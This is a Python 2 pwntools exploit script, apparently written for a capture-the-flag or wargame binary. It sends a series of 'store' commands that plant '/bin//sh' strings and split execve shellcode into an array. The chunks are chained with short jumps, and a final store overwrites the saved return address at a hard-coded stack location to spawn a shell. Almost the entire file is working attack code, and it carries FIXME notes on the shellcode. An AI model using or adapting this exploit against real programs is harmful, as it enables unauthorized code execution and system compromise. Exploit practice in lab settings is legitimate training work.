#! /usr/bin/env python

from pwn import *

EIP_INDEX = 109
EIP = 0xbffff518

JMP_OVER = "\xeb\x04"
NOP = "\x90"

NIB = 0x6e69622f
SH = 0x68732f2f

"""
xor ecx, ecx    ; ecx = 0
mul ecx         ; edx = eax = 0
mov al, 0x0b    ; execve syscall
mov bx, 0x4141    ; ebx = "/bin/bash" FIXME TO PROPER ADDR
mov bx, 0x41
mov bl, 0x41
int 0x80        ; syscall execve[eax]("/bin/bash" [ebx], NULL [ecx], NULL [edx])
"""

SHELL_ASM = [
( asm("mov bx, 0xbfff;"), 4),
( asm("xor ecx, ecx;") + JMP_OVER, 5),
( asm("shl ebx, 16; nop;"), 7), # ebx = "/bin/bash" FIXME TO PROPER ADDR
( asm("mul ecx;") + JMP_OVER, 8),
( asm("mov bx, 0xf50c"), 10),
( asm("mov al, 0x0b; int 0x80;"), 11),
]

out = ""

out += "store\n" #\n%d\n1" % NIB
out += "%d\n" % NIB
out += "1\n"
out += "store\n"
out += "%d\n" % SH
out += "2\n"

for inst, index in SHELL_ASM:
    out += "store\n"
    out += "%d\n" % int(p32(int(inst.encode('hex'), 16)).encode("hex"), 16)
    out += "%d\n" %  index
    
out += "store\n"
out += "%d\n" % EIP
out += "%d\n" % EIP_INDEX

out += "quit\n"

print out